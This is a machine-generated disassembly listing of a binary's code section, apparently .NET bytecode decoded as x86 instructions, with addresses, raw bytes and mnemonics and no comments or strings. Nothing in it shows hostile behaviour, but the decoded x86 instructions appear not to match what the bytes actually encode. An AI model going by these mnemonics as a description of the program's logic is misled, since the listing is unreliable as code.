  402b2d:	04 6f                	add    $0x6f,%al
  402b2f:	5e                   	pop    %esi
  402b30:	00 00                	add    %al,(%eax)
  402b32:	0a 13                	or     (%ebx),%dl
  402b34:	06                   	push   %es
  402b35:	12 06                	adc    (%esi),%al
  402b37:	28 60 00             	sub    %ah,0x0(%eax)
  402b3a:	00 0a                	add    %cl,(%edx)
  402b3c:	0d 28 4c 00 00       	or     $0x4c28,%eax
  402b41:	0a 6f 4d             	or     0x4d(%edi),%ch
  402b44:	00 00                	add    %al,(%eax)
  402b46:	0a 6f 61             	or     0x61(%edi),%ch
  402b49:	00 00                	add    %al,(%eax)
  402b4b:	0a 13                	or     (%ebx),%dl
  402b4d:	04 02                	add    $0x2,%al
  402b4f:	28 47 00             	sub    %al,0x0(%edi)
  402b52:	00 06                	add    %al,(%esi)
  402b54:	7d 2a                	jge    0x402b80
  402b56:	00 00                	add    %al,(%eax)
  402b58:	04 02                	add    $0x2,%al
  402b5a:	72 63                	jb     0x402bbf
  402b5c:	03 00                	add    (%eax),%eax
  402b5e:	70 1e                	jo     0x402b7e
  402b60:	8d 0b                	lea    (%ebx),%ecx
  402b62:	00 00                	add    %al,(%eax)
  402b64:	01 25 16 02 7b 2a    	add    %esp,0x2a7b0216
  402b6a:	00 00                	add    %al,(%eax)
  402b6c:	04 7b                	add    $0x7b,%al
  402b6e:	51                   	push   %ecx
  402b6f:	00 00                	add    %al,(%eax)
  402b71:	04 a2                	add    $0xa2,%al
  402b73:	25 17 02 7b 2a       	and    $0x2a7b0217,%eax
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	04 7b                	add    $0x7b,%al
  402b7c:	4f                   	dec    %edi
  402b7d:	00 00                	add    %al,(%eax)
  402b7f:	04 a2                	add    $0xa2,%al
  402b81:	25 18 28 43 00       	and    $0x432818,%eax
  402b86:	00 06                	add    %al,(%esi)
  402b88:	a2 25 19 07 8c       	mov    %al,0x8c071925
  402b8d:	42                   	inc    %edx
  402b8e:	00 00                	add    %al,(%eax)
  402b90:	01 a2 25 1a 08 8c    	add    %esp,-0x73f7e5db(%edx)
  402b96:	43                   	inc    %ebx
  402b97:	00 00                	add    %al,(%eax)
  402b99:	01 a2 25 1b 09 8c    	add    %esp,-0x73f6e4db(%edx)
  402b9f:	43                   	inc    %ebx
  402ba0:	00 00                	add    %al,(%eax)
  402ba2:	01 a2 25 1c 11 04    	add    %esp,0x4111c25(%edx)
  402ba8:	a2 25 1d 72 49       	mov    %al,0x49721d25
  402bad:	03 00                	add    (%eax),%eax
  402baf:	70 a2                	jo     0x402b53
  402bb1:	28 62 00             	sub    %ah,0x0(%edx)
  402bb4:	00 0a                	add    %cl,(%edx)
  402bb6:	7d 29                	jge    0x402be1
  402bb8:	00 00                	add    %al,(%eax)
  402bba:	04 02                	add    $0x2,%al
  402bbc:	7b 2c                	jnp    0x402bea
  402bbe:	00 00                	add    %al,(%eax)
  402bc0:	04 02                	add    $0x2,%al
  402bc2:	7b 29                	jnp    0x402bed
  402bc4:	00 00                	add    %al,(%eax)
  402bc6:	04 6f                	add    $0x6f,%al
  402bc8:	63 00                	arpl   %eax,(%eax)
  402bca:	00 0a                	add    %cl,(%edx)
  402bcc:	02 23                	add    (%ebx),%ah
  402bce:	00 00                	add    %al,(%eax)
  402bd0:	00 00                	add    %al,(%eax)
  402bd2:	00 40 9f             	add    %al,-0x61(%eax)
  402bd5:	40                   	inc    %eax
  402bd6:	02 fe                	add    %dh,%bh
  402bd8:	06                   	push   %es
  402bd9:	31 00                	xor    %eax,(%eax)
  402bdb:	00 06                	add    %al,(%esi)
  402bdd:	73 64                	jae    0x402c43
  402bdf:	00 00                	add    %al,(%eax)
  402be1:	0a 28                	or     (%eax),%ch
  402be3:	1f                   	pop    %ds
  402be4:	00 00                	add    %al,(%eax)
  402be6:	06                   	push   %es
  402be7:	2a 01                	sub    (%ecx),%al
  402be9:	10 00                	adc    %al,(%eax)
  402beb:	00 02                	add    %al,(%edx)
  402bed:	00 31                	add    %dh,(%ecx)
  402bef:	01 0a                	add    %ecx,(%edx)
  402bf1:	3b 01                	cmp    (%ecx),%eax
  402bf3:	0c 00                	or     $0x0,%al
  402bf5:	00 00                	add    %al,(%eax)
  402bf7:	00 13                	add    %dl,(%ebx)
  402bf9:	30 03                	xor    %al,(%ebx)
  402bfb:	00 43 00             	add    %al,0x0(%ebx)
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	09 00                	or     %eax,(%eax)
  402c02:	00 11                	add    %dl,(%ecx)
  402c04:	73 35                	jae    0x402c3b
  402c06:	00 00                	add    %al,(%eax)
  402c08:	06                   	push   %es
  402c09:	0a 06                	or     (%esi),%al
  402c0b:	02 7d 36             	add    0x36(%ebp),%bh
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	04 06                	add    $0x6,%al
  402c12:	04 7d                	add    $0x7d,%al
  402c14:	37                   	aaa
  402c15:	00 00                	add    %al,(%eax)
  402c17:	04 06                	add    $0x6,%al
  402c19:	03 73 65             	add    0x65(%ebx),%esi
  402c1c:	00 00                	add    %al,(%eax)
  402c1e:	0a 7d 35             	or     0x35(%ebp),%bh
  402c21:	00 00                	add    %al,(%eax)
  402c23:	04 06                	add    $0x6,%al
  402c25:	7b 35                	jnp    0x402c5c
  402c27:	00 00                	add    %al,(%eax)
  402c29:	04 06                	add    $0x6,%al
  402c2b:	fe 06                	incb   (%esi)
  402c2d:	36 00 00             	add    %al,%ss:(%eax)
  402c30:	06                   	push   %es
  402c31:	73 66                	jae    0x402c99
  402c33:	00 00                	add    %al,(%eax)
  402c35:	0a 6f 67             	or     0x67(%edi),%ch
  402c38:	00 00                	add    %al,(%eax)
  402c3a:	0a 06                	or     (%esi),%al
  402c3c:	7b 35                	jnp    0x402c73
  402c3e:	00 00                	add    %al,(%eax)
  402c40:	04 6f                	add    $0x6f,%al
  402c42:	68 00 00 0a 2a       	push   $0x2a0a0000
  402c47:	00 13                	add    %dl,(%ebx)
  402c49:	30 02                	xor    %al,(%edx)
  402c4b:	00 4d 00             	add    %cl,0x0(%ebp)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 00                	add    %al,(%eax)
  402c52:	00 00                	add    %al,(%eax)
  402c54:	03 28                	add    (%eax),%ebp
  402c56:	69 00 00 0a 20 a3    	imul   $0xa3200a00,(%eax),%eax
  402c5c:	00 00                	add    %al,(%eax)
  402c5e:	00 33                	add    %dh,(%ebx)
  402c60:	0c 03                	or     $0x3,%al
  402c62:	7e 6a                	jle    0x402cce
  402c64:	00 00                	add    %al,(%eax)
  402c66:	0a 28                	or     (%eax),%ch
  402c68:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c6b:	0a 2a                	or     (%edx),%ch
  402c6d:	02 03                	add    (%ebx),%al
  402c6f:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402c73:	0a 03                	or     (%ebx),%al
  402c75:	28 69 00             	sub    %ch,0x0(%ecx)
  402c78:	00 0a                	add    %cl,(%edx)
  402c7a:	20 84 00 00 00 33 1f 	and    %al,0x1f330000(%eax,%eax,1)
  402c81:	03 28                	add    (%eax),%ebp
  402c83:	6d                   	insl   (%dx),%es:(%edi)
  402c84:	00 00                	add    %al,(%eax)
  402c86:	0a 17                	or     (%edi),%dl
  402c88:	28 6e 00             	sub    %ch,0x0(%esi)
  402c8b:	00 0a                	add    %cl,(%edx)
  402c8d:	28 6f 00             	sub    %ch,0x0(%edi)
  402c90:	00 0a                	add    %cl,(%edx)
  402c92:	2c 0c                	sub    $0xc,%al
  402c94:	03 18                	add    (%eax),%ebx
  402c96:	28 6e 00             	sub    %ch,0x0(%esi)
  402c99:	00 0a                	add    %cl,(%edx)
  402c9b:	28 6b 00             	sub    %ch,0x0(%ebx)
  402c9e:	00 0a                	add    %cl,(%edx)
  402ca0:	2a 4a 02             	sub    0x2(%edx),%cl
  402ca3:	02 7b 28             	add    0x28(%ebx),%bh
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	04 16                	add    $0x16,%al
  402caa:	fe 01                	incb   (%ecx)
  402cac:	03 5f 28             	add    0x28(%edi),%ebx
  402caf:	70 00                	jo     0x402cb1
  402cb1:	00 0a                	add    %cl,(%edx)
  402cb3:	2a de                	sub    %dh,%bl
  402cb5:	04 6f                	add    $0x6f,%al
  402cb7:	71 00                	jno    0x402cb9
  402cb9:	00 0a                	add    %cl,(%edx)
  402cbb:	19 2e                	sbb    %ebp,(%esi)
  402cbd:	01 2a                	add    %ebp,(%edx)
  402cbf:	02 7e 44             	add    0x44(%esi),%bh
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	04 7e                	add    $0x7e,%al
  402cc6:	42                   	inc    %edx
  402cc7:	00 00                	add    %al,(%eax)
  402cc9:	04 72                	add    $0x72,%al
  402ccb:	55                   	push   %ebp
  402ccc:	03 00                	add    (%eax),%eax
  402cce:	70 72                	jo     0x402d42
  402cd0:	3d 01 00 70 6f       	cmp    $0x6f700001,%eax
  402cd5:	51                   	push   %ecx
  402cd6:	00 00                	add    %al,(%eax)
  402cd8:	0a 19                	or     (%ecx),%bl
  402cda:	1f                   	pop    %ds
  402cdb:	30 28                	xor    %ch,(%eax)
  402cdd:	72 00                	jb     0x402cdf
  402cdf:	00 0a                	add    %cl,(%edx)
  402ce1:	1c 2e                	sbb    $0x2e,%al
  402ce3:	07                   	pop    %es
  402ce4:	04 17                	add    $0x17,%al
  402ce6:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce7:	73 00                	jae    0x402ce9
  402ce9:	00 0a                	add    %cl,(%edx)
  402ceb:	2a 66 02             	sub    0x2(%esi),%ah
  402cee:	02 fe                	add    %dh,%bh
  402cf0:	06                   	push   %es
  402cf1:	22 00                	and    (%eax),%al
  402cf3:	00 06                	add    %al,(%esi)
  402cf5:	73 74                	jae    0x402d6b
  402cf7:	00 00                	add    %al,(%eax)
  402cf9:	0a 28                	or     (%eax),%ch
  402cfb:	75 00                	jne    0x402cfd
  402cfd:	00 0a                	add    %cl,(%edx)
  402cff:	02 28                	add    (%eax),%ch
  402d01:	11 00                	adc    %eax,(%eax)
  402d03:	00 0a                	add    %cl,(%edx)
  402d05:	2a 00                	sub    (%eax),%al
  402d07:	00 13                	add    %dl,(%ebx)
  402d09:	30 05 00 84 00 00    	xor    %al,0x8400
  402d0f:	00 0a                	add    %cl,(%edx)
  402d11:	00 00                	add    %al,(%eax)
  402d13:	11 02                	adc    %eax,(%edx)
  402d15:	7b 2c                	jnp    0x402d43
  402d17:	00 00                	add    %al,(%eax)
  402d19:	04 16                	add    $0x16,%al
  402d1b:	6f                   	outsl  %ds:(%esi),(%dx)
  402d1c:	76 00                	jbe    0x402d1e
  402d1e:	00 0a                	add    %cl,(%edx)
  402d20:	02 7b 2c             	add    0x2c(%ebx),%bh
  402d23:	00 00                	add    %al,(%eax)
  402d25:	04 02                	add    $0x2,%al
  402d27:	02 7b 2c             	add    0x2c(%ebx),%bh
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	04 7e                	add    $0x7e,%al
  402d2e:	26 00 00             	add    %al,%es:(%eax)
  402d31:	04 02                	add    $0x2,%al
  402d33:	7b 2a                	jnp    0x402d5f
  402d35:	00 00                	add    %al,(%eax)
  402d37:	04 7b                	add    $0x7b,%al
  402d39:	4f                   	dec    %edi
  402d3a:	00 00                	add    %al,(%eax)
  402d3c:	04 73                	add    $0x73,%al
  402d3e:	0d 00 00 06 6f       	or     $0x6f060000,%eax
  402d43:	77 00                	ja     0x402d45
  402d45:	00 0a                	add    %cl,(%edx)
  402d47:	02 7b 2c             	add    0x2c(%ebx),%bh
  402d4a:	00 00                	add    %al,(%eax)
  402d4c:	04 6f                	add    $0x6f,%al
  402d4e:	0b 00                	or     (%eax),%eax
  402d50:	00 0a                	add    %cl,(%edx)
  402d52:	72 16                	jb     0x402d6a
  402d54:	04 00                	add    $0x0,%al
  402d56:	70 6f                	jo     0x402dc7
  402d58:	78 00                	js     0x402d5a
  402d5a:	00 0a                	add    %cl,(%edx)
  402d5c:	0a 02                	or     (%edx),%al
  402d5e:	16                   	push   %ss
  402d5f:	7d 28                	jge    0x402d89
  402d61:	00 00                	add    %al,(%eax)
  402d63:	04 02                	add    $0x2,%al
  402d65:	17                   	pop    %ss
  402d66:	28 79 00             	sub    %bh,0x0(%ecx)
  402d69:	00 0a                	add    %cl,(%edx)
  402d6b:	06                   	push   %es
  402d6c:	75 52                	jne    0x402dc0
  402d6e:	00 00                	add    %al,(%eax)
  402d70:	01 2c 0a             	add    %ebp,(%edx,%ecx,1)
  402d73:	06                   	push   %es
  402d74:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402d75:	52                   	push   %edx
  402d76:	00 00                	add    %al,(%eax)
  402d78:	01 0b                	add    %ecx,(%ebx)
  402d7a:	17                   	pop    %ss
  402d7b:	2b 01                	sub    (%ecx),%eax
  402d7d:	16                   	push   %ss
  402d7e:	07                   	pop    %es
  402d7f:	5f                   	pop    %edi
  402d80:	2c 0f                	sub    $0xf,%al
  402d82:	02 28                	add    (%eax),%ch
  402d84:	25 00 00 06 2c       	and    $0x2c060000,%eax
  402d89:	07                   	pop    %es
  402d8a:	02 28                	add    (%eax),%ch
  402d8c:	27                   	daa
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	2a 02                	sub    (%edx),%al
  402d92:	28 28                	sub    %ch,(%eax)
  402d94:	00 00                	add    %al,(%eax)
  402d96:	06                   	push   %es
  402d97:	2a 62 02             	sub    0x2(%edx),%ah
  402d9a:	7b 2c                	jnp    0x402dc8
  402d9c:	00 00                	add    %al,(%eax)
  402d9e:	04 6f                	add    $0x6f,%al
  402da0:	7a 00                	jp     0x402da2
  402da2:	00 0a                	add    %cl,(%edx)
  402da4:	6f                   	outsl  %ds:(%esi),(%dx)
  402da5:	7b 00                	jnp    0x402da7
  402da7:	00 0a                	add    %cl,(%edx)
  402da9:	1f                   	pop    %ds
  402daa:	0b fe                	or     %esi,%edi
  402dac:	04 16                	add    $0x16,%al
  402dae:	fe 01                	incb   (%ecx)
  402db0:	2a 9e 02 7b 2c 00    	sub    0x2c7b02(%esi),%bl
  402db6:	00 04 16             	add    %al,(%esi,%edx,1)
  402db9:	6f                   	outsl  %ds:(%esi),(%dx)
  402dba:	79 00                	jns    0x402dbc
  402dbc:	00 0a                	add    %cl,(%edx)
  402dbe:	02 16                	add    (%esi),%dl
  402dc0:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  402dc4:	0a 02                	or     (%edx),%al
  402dc6:	16                   	push   %ss
  402dc7:	28 29                	sub    %ch,(%ecx)
  402dc9:	00 00                	add    %al,(%eax)
  402dcb:	06                   	push   %es
  402dcc:	02 7b 2d             	add    0x2d(%ebx),%bh
  402dcf:	00 00                	add    %al,(%eax)
  402dd1:	04 17                	add    $0x17,%al
  402dd3:	6f                   	outsl  %ds:(%esi),(%dx)
  402dd4:	79 00                	jns    0x402dd6
  402dd6:	00 0a                	add    %cl,(%edx)
  402dd8:	2a 9e 02 16 28 7c    	sub    0x7c281602(%esi),%bl
  402dde:	00 00                	add    %al,(%eax)
  402de0:	0a 02                	or     (%edx),%al
  402de2:	7b 2d                	jnp    0x402e11
  402de4:	00 00                	add    %al,(%eax)
  402de6:	04 16                	add    $0x16,%al
  402de8:	6f                   	outsl  %ds:(%esi),(%dx)
  402de9:	79 00                	jns    0x402deb
  402deb:	00 0a                	add    %cl,(%edx)
  402ded:	02 16                	add    (%esi),%dl
  402def:	28 29                	sub    %ch,(%ecx)
  402df1:	00 00                	add    %al,(%eax)
  402df3:	06                   	push   %es
  402df4:	02 7b 2c             	add    0x2c(%ebx),%bh
  402df7:	00 00                	add    %al,(%eax)
  402df9:	04 17                	add    $0x17,%al
  402dfb:	6f                   	outsl  %ds:(%esi),(%dx)
  402dfc:	79 00                	jns    0x402dfe
  402dfe:	00 0a                	add    %cl,(%edx)
  402e00:	2a 9e 02 7b 2c 00    	sub    0x2c7b02(%esi),%bl
  402e06:	00 04 16             	add    %al,(%esi,%edx,1)
  402e09:	6f                   	outsl  %ds:(%esi),(%dx)
  402e0a:	79 00                	jns    0x402e0c
  402e0c:	00 0a                	add    %cl,(%edx)
  402e0e:	02 16                	add    (%esi),%dl
  402e10:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  402e14:	0a 02                	or     (%edx),%al
  402e16:	7b 2d                	jnp    0x402e45
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	04 16                	add    $0x16,%al
  402e1c:	6f                   	outsl  %ds:(%esi),(%dx)
  402e1d:	79 00                	jns    0x402e1f
  402e1f:	00 0a                	add    %cl,(%edx)
  402e21:	02 17                	add    (%edi),%dl
  402e23:	28 29                	sub    %ch,(%ecx)
  402e25:	00 00                	add    %al,(%eax)
  402e27:	06                   	push   %es
  402e28:	2a 00                	sub    (%eax),%al
  402e2a:	00 00                	add    %al,(%eax)
  402e2c:	13 30                	adc    (%eax),%esi
  402e2e:	02 00                	add    (%eax),%al
  402e30:	4c                   	dec    %esp
  402e31:	00 00                	add    %al,(%eax)
  402e33:	00 00                	add    %al,(%eax)
  402e35:	00 00                	add    %al,(%eax)
  402e37:	00 02                	add    %al,(%edx)
  402e39:	7b 31                	jnp    0x402e6c
  402e3b:	00 00                	add    %al,(%eax)
  402e3d:	04 03                	add    $0x3,%al
  402e3f:	6f                   	outsl  %ds:(%esi),(%dx)
  402e40:	79 00                	jns    0x402e42
  402e42:	00 0a                	add    %cl,(%edx)
  402e44:	02 7b 2e             	add    0x2e(%ebx),%bh
  402e47:	00 00                	add    %al,(%eax)
  402e49:	04 03                	add    $0x3,%al
  402e4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e4c:	79 00                	jns    0x402e4e
  402e4e:	00 0a                	add    %cl,(%edx)
  402e50:	02 7b 2f             	add    0x2f(%ebx),%bh
  402e53:	00 00                	add    %al,(%eax)
  402e55:	04 03                	add    $0x3,%al
  402e57:	6f                   	outsl  %ds:(%esi),(%dx)
  402e58:	79 00                	jns    0x402e5a
  402e5a:	00 0a                	add    %cl,(%edx)
  402e5c:	02 7b 30             	add    0x30(%ebx),%bh
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	04 03                	add    $0x3,%al
  402e63:	6f                   	outsl  %ds:(%esi),(%dx)
  402e64:	79 00                	jns    0x402e66
  402e66:	00 0a                	add    %cl,(%edx)
  402e68:	02 7b 32             	add    0x32(%ebx),%bh
  402e6b:	00 00                	add    %al,(%eax)
  402e6d:	04 03                	add    $0x3,%al
  402e6f:	6f                   	outsl  %ds:(%esi),(%dx)
  402e70:	79 00                	jns    0x402e72
  402e72:	00 0a                	add    %cl,(%edx)
  402e74:	03 2c 0c             	add    (%esp,%ecx,1),%ebp
  402e77:	02 7b 2f             	add    0x2f(%ebx),%bh
  402e7a:	00 00                	add    %al,(%eax)
  402e7c:	04 6f                	add    $0x6f,%al
  402e7e:	7d 00                	jge    0x402e80
  402e80:	00 0a                	add    %cl,(%edx)
  402e82:	26 2a 92 02 28 26 00 	sub    %es:0x262802(%edx),%dl
  402e89:	00 06                	add    %al,(%esi)
  402e8b:	02 7b 2c             	add    0x2c(%ebx),%bh
  402e8e:	00 00                	add    %al,(%eax)
  402e90:	04 17                	add    $0x17,%al
  402e92:	6f                   	outsl  %ds:(%esi),(%dx)
  402e93:	76 00                	jbe    0x402e95
  402e95:	00 0a                	add    %cl,(%edx)
  402e97:	02 7b 2c             	add    0x2c(%ebx),%bh
  402e9a:	00 00                	add    %al,(%eax)
  402e9c:	04 02                	add    $0x2,%al
  402e9e:	7b 29                	jnp    0x402ec9
  402ea0:	00 00                	add    %al,(%eax)
  402ea2:	04 6f                	add    $0x6f,%al
  402ea4:	63 00                	arpl   %eax,(%eax)
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	2a 32                	sub    (%edx),%dh
  402eaa:	02 7e 26             	add    0x26(%esi),%bh
  402ead:	00 00                	add    %al,(%eax)
  402eaf:	04 28                	add    $0x28,%al
  402eb1:	2c 00                	sub    $0x0,%al
  402eb3:	00 06                	add    %al,(%esi)
  402eb5:	2a 00                	sub    (%eax),%al
  402eb7:	00 1b                	add    %bl,(%ebx)
  402eb9:	30 05 00 4b 00 00    	xor    %al,0x4b00
  402ebf:	00 00                	add    %al,(%eax)
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	00 03                	add    %al,(%ebx)
  402ec5:	2c 47                	sub    $0x47,%al
  402ec7:	03 72 2e             	add    0x2e(%edx),%esi
  402eca:	04 00                	add    $0x0,%al
  402ecc:	70 6f                	jo     0x402f3d
  402ece:	7e 00                	jle    0x402ed0
  402ed0:	00 0a                	add    %cl,(%edx)
  402ed2:	2c 3a                	sub    $0x3a,%al
  402ed4:	03 28                	add    (%eax),%ebp
  402ed6:	4a                   	dec    %edx
  402ed7:	00 00                	add    %al,(%eax)
  402ed9:	0a 26                	or     (%esi),%ah
  402edb:	de 31                	fidivs (%ecx)
  402edd:	26 02 7e 45          	add    %es:0x45(%esi),%bh
  402ee1:	00 00                	add    %al,(%eax)
  402ee3:	04 72                	add    $0x72,%al
  402ee5:	40                   	inc    %eax
  402ee6:	04 00                	add    $0x0,%al
  402ee8:	70 03                	jo     0x402eed
  402eea:	6f                   	outsl  %ds:(%esi),(%dx)
  402eeb:	51                   	push   %ecx
  402eec:	00 00                	add    %al,(%eax)
  402eee:	0a 7e 42             	or     0x42(%esi),%bh
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	04 72                	add    $0x72,%al
  402ef5:	55                   	push   %ebp
  402ef6:	03 00                	add    (%eax),%eax
  402ef8:	70 72                	jo     0x402f6c
  402efa:	3d 01 00 70 6f       	cmp    $0x6f700001,%eax
  402eff:	51                   	push   %ecx
  402f00:	00 00                	add    %al,(%eax)
  402f02:	0a 16                	or     (%esi),%dl
  402f04:	1f                   	pop    %ds
  402f05:	10 28                	adc    %ch,(%eax)
  402f07:	72 00                	jb     0x402f09
  402f09:	00 0a                	add    %cl,(%edx)
  402f0b:	26 de 00             	fiadds %es:(%eax)
  402f0e:	2a 00                	sub    (%eax),%al
  402f10:	01 10                	add    %edx,(%eax)
  402f12:	00 00                	add    %al,(%eax)
  402f14:	00 00                	add    %al,(%eax)
  402f16:	10 00                	adc    %al,(%eax)
  402f18:	09 19                	or     %ebx,(%ecx)
  402f1a:	00 31                	add    %dh,(%ecx)
  402f1c:	0b 00                	or     (%eax),%eax
  402f1e:	00 01                	add    %al,(%ecx)
  402f20:	1e                   	push   %ds
  402f21:	02 28                	add    (%eax),%ch
  402f23:	11 00                	adc    %eax,(%eax)
  402f25:	00 0a                	add    %cl,(%edx)
  402f27:	2a 1b                	sub    (%ebx),%bl
  402f29:	30 04 00             	xor    %al,(%eax,%eax,1)
  402f2c:	53                   	push   %ebx
  402f2d:	00 00                	add    %al,(%eax)
  402f2f:	00 0b                	add    %cl,(%ebx)
  402f31:	00 00                	add    %al,(%eax)
  402f33:	11 02                	adc    %eax,(%edx)
  402f35:	7b 2c                	jnp    0x402f63
  402f37:	00 00                	add    %al,(%eax)
  402f39:	04 6f                	add    $0x6f,%al
  402f3b:	7f 00                	jg     0x402f3d
  402f3d:	00 0a                	add    %cl,(%edx)
  402f3f:	75 08                	jne    0x402f49
  402f41:	00 00                	add    %al,(%eax)
  402f43:	02 0a                	add    (%edx),%cl
  402f45:	06                   	push   %es
  402f46:	2c 39                	sub    $0x39,%al
  402f48:	d0 03                	rolb   $1,(%ebx)
  402f4a:	00 00                	add    %al,(%eax)
  402f4c:	02 28                	add    (%eax),%ch
  402f4e:	80 00 00             	addb   $0x0,(%eax)
  402f51:	0a 72 4a             	or     0x4a(%edx),%dh
  402f54:	04 00                	add    $0x0,%al
  402f56:	70 73                	jo     0x402fcb
  402f58:	81 00 00 0a 06 7e    	addl   $0x7e060a00,(%eax)
  402f5e:	34 00                	xor    $0x0,%al
  402f60:	00 04 25 2d 17 26 7e 	add    %al,0x7e26172d(,%eiz,1)
  402f67:	33 00                	xor    (%eax),%eax
  402f69:	00 04 fe             	add    %al,(%esi,%edi,8)
  402f6c:	06                   	push   %es
  402f6d:	34 00                	xor    $0x0,%al
  402f6f:	00 06                	add    %al,(%esi)
  402f71:	73 06                	jae    0x402f79
  402f73:	00 00                	add    %al,(%eax)
  402f75:	06                   	push   %es
  402f76:	25 80 34 00 00       	and    $0x3480,%eax
  402f7b:	04 6f                	add    $0x6f,%al
  402f7d:	82 00 00             	addb   $0x0,(%eax)
  402f80:	0a de                	or     %dh,%bl
  402f82:	03 26                	add    (%esi),%esp
  402f84:	de 00                	fiadds (%eax)
  402f86:	2a 00                	sub    (%eax),%al
  402f88:	01 10                	add    %edx,(%eax)
  402f8a:	00 00                	add    %al,(%eax)
  402f8c:	00 00                	add    %al,(%eax)
  402f8e:	00 00                	add    %al,(%eax)
  402f90:	4f                   	dec    %edi
  402f91:	4f                   	dec    %edi
  402f92:	00 03                	add    %al,(%ebx)
  402f94:	0b 00                	or     (%eax),%eax
  402f96:	00 01                	add    %al,(%ecx)
  402f98:	7a 03                	jp     0x402f9d
  402f9a:	2c 13                	sub    $0x13,%al
  402f9c:	02 7b 2b             	add    0x2b(%ebx),%bh
  402f9f:	00 00                	add    %al,(%eax)
  402fa1:	04 2c                	add    $0x2c,%al
  402fa3:	0b 02                	or     (%edx),%eax
  402fa5:	7b 2b                	jnp    0x402fd2
  402fa7:	00 00                	add    %al,(%eax)
  402fa9:	04 6f                	add    $0x6f,%al
  402fab:	3a 00                	cmp    (%eax),%al
  402fad:	00 0a                	add    %cl,(%edx)
  402faf:	02 03                	add    (%ebx),%al
  402fb1:	28 83 00 00 0a 2a    	sub    %al,0x2a0a0000(%ebx)
  402fb7:	00 13                	add    %dl,(%ebx)
  402fb9:	30 06                	xor    %al,(%esi)
  402fbb:	00 88 07 00 00 00    	add    %cl,0x7(%eax)
  402fc1:	00 00                	add    %al,(%eax)
  402fc3:	00 02                	add    %al,(%edx)
  402fc5:	73 84                	jae    0x402f4b
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 7d 2c             	or     0x2c(%ebp),%bh
  402fcc:	00 00                	add    %al,(%eax)
  402fce:	04 02                	add    $0x2,%al
  402fd0:	73 85                	jae    0x402f57
  402fd2:	00 00                	add    %al,(%eax)
  402fd4:	0a 7d 2d             	or     0x2d(%ebp),%bh
  402fd7:	00 00                	add    %al,(%eax)
  402fd9:	04 02                	add    $0x2,%al
  402fdb:	73 86                	jae    0x402f63
  402fdd:	00 00                	add    %al,(%eax)
  402fdf:	0a 7d 2e             	or     0x2e(%ebp),%bh
  402fe2:	00 00                	add    %al,(%eax)
  402fe4:	04 02                	add    $0x2,%al
  402fe6:	73 85                	jae    0x402f6d
  402fe8:	00 00                	add    %al,(%eax)
  402fea:	0a 7d 31             	or     0x31(%ebp),%bh
  402fed:	00 00                	add    %al,(%eax)
  402fef:	04 02                	add    $0x2,%al
  402ff1:	73 87                	jae    0x402f7a
  402ff3:	00 00                	add    %al,(%eax)
  402ff5:	0a 7d 30             	or     0x30(%ebp),%bh
  402ff8:	00 00                	add    %al,(%eax)
  402ffa:	04 02                	add    $0x2,%al
  402ffc:	73 87                	jae    0x402f85
  402ffe:	00 00                	add    %al,(%eax)
  403000:	0a 7d 2f             	or     0x2f(%ebp),%bh
  403003:	00 00                	add    %al,(%eax)
  403005:	04 02                	add    $0x2,%al
  403007:	73 88                	jae    0x402f91
  403009:	00 00                	add    %al,(%eax)
  40300b:	0a 7d 32             	or     0x32(%ebp),%bh
  40300e:	00 00                	add    %al,(%eax)
  403010:	04 02                	add    $0x2,%al
  403012:	7b 2d                	jnp    0x403041
  403014:	00 00                	add    %al,(%eax)
  403016:	04 6f                	add    $0x6f,%al
  403018:	89 00                	mov    %eax,(%eax)
  40301a:	00 0a                	add    %cl,(%edx)
  40301c:	02 7b 31             	add    0x31(%ebx),%bh
  40301f:	00 00                	add    %al,(%eax)
  403021:	04 6f                	add    $0x6f,%al
  403023:	89 00                	mov    %eax,(%eax)
  403025:	00 0a                	add    %cl,(%edx)
  403027:	02 28                	add    (%eax),%ch
  403029:	8a 00                	mov    (%eax),%al
  40302b:	00 0a                	add    %cl,(%edx)
  40302d:	02 7b 2c             	add    0x2c(%ebx),%bh
  403030:	00 00                	add    %al,(%eax)
  403032:	04 16                	add    $0x16,%al
  403034:	6f                   	outsl  %ds:(%esi),(%dx)
  403035:	8b 00                	mov    (%eax),%eax
  403037:	00 0a                	add    %cl,(%edx)
  403039:	02 7b 2c             	add    0x2c(%ebx),%bh
  40303c:	00 00                	add    %al,(%eax)
  40303e:	04 1f                	add    $0x1f,%al
  403040:	0f 6f 8c 00 00 0a 02 	movq   0x7b020a00(%eax,%eax,1),%mm1
  403047:	7b 
  403048:	2c 00                	sub    $0x0,%al
  40304a:	00 04 16             	add    %al,(%esi,%edx,1)
  40304d:	6f                   	outsl  %ds:(%esi),(%dx)
  40304e:	8d 00                	lea    (%eax),%eax
  403050:	00 0a                	add    %cl,(%edx)
  403052:	02 7b 2c             	add    0x2c(%ebx),%bh
  403055:	00 00                	add    %al,(%eax)
  403057:	04 16                	add    $0x16,%al
  403059:	1f                   	pop    %ds
  40305a:	19 73 8e             	sbb    %esi,-0x72(%ebx)
  40305d:	00 00                	add    %al,(%eax)
  40305f:	0a 6f 8f             	or     -0x71(%edi),%ch
  403062:	00 00                	add    %al,(%eax)
  403064:	0a 02                	or     (%edx),%al
  403066:	7b 2c                	jnp    0x403094
  403068:	00 00                	add    %al,(%eax)
  40306a:	04 1f                	add    $0x1f,%al
  40306c:	14 1f                	adc    $0x1f,%al
  40306e:	14 73                	adc    $0x73,%al
  403070:	90                   	nop
